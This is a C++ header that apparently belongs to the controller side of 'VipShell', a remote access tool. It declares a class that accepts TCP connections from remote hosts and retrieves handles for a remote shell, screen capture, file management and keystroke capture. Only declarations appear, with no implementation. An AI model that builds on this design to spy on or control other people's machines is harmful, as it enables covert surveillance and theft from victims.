#pragma once

#include "..\vipshellinfo\threadbase.h"	
#include ".\serverconnecthandle.h"
#include ".\servershellhandle.h"
#include ".\serverscreeninfohandle.h"
#include ".\servergetcappicture.h"
#include ".\serverfilemanagehandle.h"
#include ".\servergetkeynohookhandle.h"
#include <map>


struct tagServerHandle
{
	DWORD dwServerType;
	SOCKET s;
};class CVipShellClientServer : public CThreadBase
{
public:
	CVipShellClientServer(void);
	~CVipShellClientServer(void);
public:
	virtual void OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter);
	bool Create(DWORD dwPort);
	bool Close();
public:
	bool GetConnectHandle(CServerConnectHandle* hServer);
	bool GetShellHandle(CServerShellHandle* hServer);
	bool GetScreenInfoHandle(CServerScreenInfoHandle* hServer);
	bool GetCapHandle(CServerGetCapPictureHandle* hServer);
	bool GetCServerFileManageHandle(CServerFileManageHandle* hServer);
	bool GetServerGetKeyNoHookHandle(CServerGetKeyNoHookHandle* hServer);
protected:
	SOCKET _GetServer(DWORD dwType, LPVOID lp);
	void _OnServerLink(SOCKET s);
	void _WaitForConnect(DWORD dwThreadId);
	void _AddServer(DWORD dwType, SOCKET s);
	void _CopyServerSystemInfo(tagServerSystemInfo* p1, tagServerSystemInfo* p2);
protected:
	std::vector<tagServerHandle> m_vecServer;
	typedef std::map<SOCKET, tagServerSystemInfo> SERVERINFO_MAP;
	SERVERINFO_MAP m_ServerMap;
	typedef std::map<SOCKET, DWORD> SERVERSCREEN_MAP;
	SERVERSCREEN_MAP m_ScreenMap;
	CMyCriticalSection m_CriticalSectionServerVector;
	CTcpServer m_hServer;
};
